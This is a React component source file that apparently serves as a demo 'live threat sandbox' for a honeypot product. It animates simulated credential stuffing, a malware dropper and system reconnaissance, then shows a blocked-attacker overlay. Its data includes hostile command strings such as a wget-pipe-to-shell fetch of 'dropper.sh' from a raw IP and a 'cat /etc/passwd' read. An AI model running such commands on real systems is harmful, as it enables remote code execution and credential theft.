"use client";

import { useState, useEffect, useRef } from "react";
import { Terminal, ShieldAlert, CheckCircle, Crosshair, Brain, Shield } from "lucide-react";

interface Simulation {
  command: string;
  output: string[];
  hassh: string;
  mitre: string;
  mttb: string;
}

const SIMULATIONS: Record<string, Simulation> = {
  stuffing: {
    command: "ssh root@182.21.9.45 -p 22",
    output: [
      "Connection established. SSH-2.0-GoSSH client detected.",
      "Trying credentials: admin / admin123 - Access Denied",
      "Trying credentials: root / password - Access Denied",
      "Trying credentials: root / root1234 - Access Denied",
      "Analyzing keystroke behavior pattern..."
    ],
    hassh: "79b36932454b5df6d28919a3b610c3b0",
    mitre: "T1110 (Brute Force - Credential Stuffing)",
    mttb: "8.4ms"
  },
  dropper: {
    command: "wget http://103.82.9.15/dropper.sh -O- | sh",
    output: [
      "GET /dropper.sh HTTP/1.1",
      "Connecting to 103.82.9.15:80... Connected.",
      "HTTP request sent, awaiting response... 200 OK",
      "Executing dynamic binary shell scripts...",
      "Intercepting payload write attempt to /tmp/shell..."
    ],
    hassh: "a15c3289bf5a454d602932f6b3b519a0",
    mitre: "T1105 (Ingress Tool Transfer - Malware Dropper)",
    mttb: "11.2ms"
  },
  exploit: {
    command: "uname -a; whoami; cat /etc/passwd",
    output: [
      "Linux Node-01 5.15.0-88-generic #98-Ubuntu SMP",
      "root",
      "Parsing user file read attempts...",
      "Keystroke replay capture recorded successfully.",
      "Flagging high-severity telemetry payload..."
    ],
    hassh: "c9023b5d5e2195f68b5cf6d45e102a90",
    mitre: "T1059 (Command and Scripting Interpreter)",
    mttb: "9.6ms"
  }
};

export default function LiveThreatSandbox() {
  const [selected, setSelected] = useState<"stuffing" | "dropper" | "exploit">("stuffing");
  const [typingText, setTypingText] = useState("");
  const [consoleLines, setConsoleLines] = useState<string[]>([]);
  const [step, setStep] = useState<"idle" | "typing" | "running" | "blocked">("idle");
  const typingTimer = useRef<NodeJS.Timeout | null>(null);

  const startSimulation = (type: "stuffing" | "dropper" | "exploit") => {
    setSelected(type);
    setStep("typing");
    setTypingText("");
    setConsoleLines([]);
    
    if (typingTimer.current) clearInterval(typingTimer.current);

    const fullCmd = SIMULATIONS[type].command;
    let charIdx = 0;
    
    typingTimer.current = setInterval(() => {
      setTypingText((prev) => prev + fullCmd.charAt(charIdx));
      charIdx++;
      if (charIdx >= fullCmd.length) {
        if (typingTimer.current) clearInterval(typingTimer.current);
        setStep("running");
        runConsoleOutputs(type);
      }
    }, 45);
  };

  const runConsoleOutputs = (type: "stuffing" | "dropper" | "exploit") => {
    const lines = SIMULATIONS[type].output;
    let idx = 0;
    
    const interval = setInterval(() => {
      setConsoleLines((prev) => [...prev, lines[idx]]);
      idx++;
      if (idx >= lines.length) {
        clearInterval(interval);
        setTimeout(() => {
          setStep("blocked");
        }, 600);
      }
    }, 500);
  };

  useEffect(() => {
    startSimulation("stuffing");
    return () => {
      if (typingTimer.current) clearInterval(typingTimer.current);
    };
  }, []);

  return (
    <div className="w-full h-full flex flex-col md:flex-row gap-5 font-mono select-none">
      {/* Simulation Trigger Buttons Panel */}
      <div className="w-full md:w-[240px] flex flex-col gap-2 shrink-0">
        <div className="text-[10px] text-slate-500 font-bold uppercase tracking-widest border-b border-white/5 pb-1">
          Select Attack Vector
        </div>
        
        <button
          onClick={() => startSimulation("stuffing")}
          className={`text-left p-3 rounded-lg border text-xs flex flex-col gap-1 transition-all cursor-pointer ${
            selected === "stuffing" 
              ? "border-blue-500/30 bg-blue-500/5 text-white" 
              : "border-white/5 hover:border-white/10 bg-[#07070a] text-slate-400"
          }`}
        >
          <span className="font-bold flex items-center gap-1.5">
            <Crosshair size={12} className={selected === "stuffing" ? "text-blue-400" : "text-slate-500"} />
            1. Credential Stuffing
          </span>
          <span className="text-[9px] text-slate-500">MITRE ATT&CK T1110</span>
        </button>

        <button
          onClick={() => startSimulation("dropper")}
          className={`text-left p-3 rounded-lg border text-xs flex flex-col gap-1 transition-all cursor-pointer ${
            selected === "dropper" 
              ? "border-cyan-500/30 bg-cyan-500/5 text-white" 
              : "border-white/5 hover:border-white/10 bg-[#07070a] text-slate-400"
          }`}
        >
          <span className="font-bold flex items-center gap-1.5">
            <Brain size={12} className={selected === "dropper" ? "text-cyan-400" : "text-slate-500"} />
            2. Malware Ingestion
          </span>
          <span className="text-[9px] text-slate-500">MITRE ATT&CK T1105</span>
        </button>

        <button
          onClick={() => startSimulation("exploit")}
          className={`text-left p-3 rounded-lg border text-xs flex flex-col gap-1 transition-all cursor-pointer ${
            selected === "exploit" 
              ? "border-purple-500/30 bg-purple-500/5 text-white" 
              : "border-white/5 hover:border-white/10 bg-[#07070a] text-slate-400"
          }`}
        >
          <span className="font-bold flex items-center gap-1.5">
            <Terminal size={12} className={selected === "exploit" ? "text-purple-400" : "text-slate-500"} />
            3. Interactive TTY Exploit
          </span>
          <span className="text-[9px] text-slate-500">MITRE ATT&CK T1059</span>
        </button>
      </div>

      {/* Interactive Cyber Operations Console */}
      <div className="flex-1 rounded-xl border border-white/5 bg-[#050508] p-4 flex flex-col gap-3 relative min-h-[220px] overflow-hidden shadow-inner">
        {/* Terminal Header */}
        <div className="flex items-center justify-between border-b border-white/5 pb-2 text-[9px] text-slate-500 uppercase tracking-widest">
          <div className="flex items-center gap-1.5">
            <span className="w-2 h-2 rounded-full bg-red-500/40" />
            <span className="w-2 h-2 rounded-full bg-yellow-500/40" />
            <span className="w-2 h-2 rounded-full bg-green-500/40" />
            <span className="font-bold text-slate-400 ml-1.5">Intrusion Shell Simulator</span>
          </div>
          <span>NODE: SENTINEL-HONEYPOT-01</span>
        </div>

        {/* Live typing output */}
        <div className="flex-1 text-[11px] leading-relaxed text-slate-300 font-mono space-y-1">
          <div className="flex items-center gap-1 text-slate-400">
            <span className="text-blue-500 font-bold">$</span>
            <span>{typingText}</span>
            {step === "typing" && <span className="w-1.5 h-3 bg-blue-500 animate-pulse ml-0.5" />}
          </div>

          <div className="space-y-1 mt-2">
            {consoleLines.map((line, i) => (
              <div key={i} className="text-slate-400 flex items-center gap-1">
                <span className="text-slate-600 font-semibold">&gt;&gt;</span>
                <span>{line}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Live Attack Analysis Telemetry / active block screen overlay */}
        {step === "blocked" && (
          <div className="absolute inset-0 bg-[#07070a]/90 backdrop-blur-sm flex flex-col items-center justify-center p-6 text-center animate-fade-in-scale z-10">
            <ShieldAlert size={28} className="text-red-500 animate-bounce mb-2" />
            <span className="text-xs uppercase font-extrabold tracking-widest text-red-500">
              ADVERSARY DETECTED & NEUTRALIZED
            </span>
            <span className="text-[10px] text-slate-400 mt-1 max-w-[280px]">
              Firewall Block Implemented. Attacker IP blocked via active iptables playbooks.
            </span>

            {/* Micro details row */}
            <div className="grid grid-cols-3 gap-3 border-t border-white/5 pt-3 mt-3 w-full max-w-[320px] text-[8px] uppercase tracking-wider font-mono">
              <div className="flex flex-col">
                <span className="text-slate-500 font-semibold">HASSH Fingerprint</span>
                <span className="text-cyan-400 mt-0.5 font-bold truncate max-w-[90px]">{SIMULATIONS[selected].hassh}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-slate-500 font-semibold">Mitre Tech</span>
                <span className="text-purple-400 mt-0.5 font-bold truncate max-w-[90px]">{SIMULATIONS[selected].mitre}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-slate-500 font-semibold">Mean Time To Block</span>
                <span className="text-emerald-400 mt-0.5 font-bold">{SIMULATIONS[selected].mttb}</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
